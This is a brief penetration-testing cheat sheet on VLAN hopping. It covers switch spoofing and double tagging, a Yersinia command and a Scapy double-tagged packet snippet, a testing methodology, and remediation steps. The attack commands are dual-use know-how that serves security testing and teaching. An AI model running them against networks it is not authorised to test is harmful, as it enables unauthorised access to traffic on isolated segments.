# VLAN Hopping

Exploiting VLAN configurations to access traffic from other VLANs.

## Attack Methods
- **Switch Spoofing**: Pretending to be a switch
- **Double Tagging**: Exploiting 802.1Q tagging

## Tools
- Yersinia, Scapy, custom scripts

## Quick Commands
```bash
# Yersinia DTP attack (GUI mode)
yersinia -G

# Scapy double tagging
from scapy.all import *
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="target")/ICMP()
sendp(packet)
```

## Methodology
1. Identify VLAN configuration
2. Test DTP (Dynamic Trunking Protocol)
3. Attempt switch spoofing
4. Test double tagging attack
5. Verify VLAN isolation

## Remediation
- Disable DTP on all access ports
- Explicitly configure trunk ports
- Use VLAN pruning
- Private VLANs
- Regular configuration audits

**MITRE**: T1599.001 | **CWE**: CWE-284 | **CAPEC**: CAPEC-605
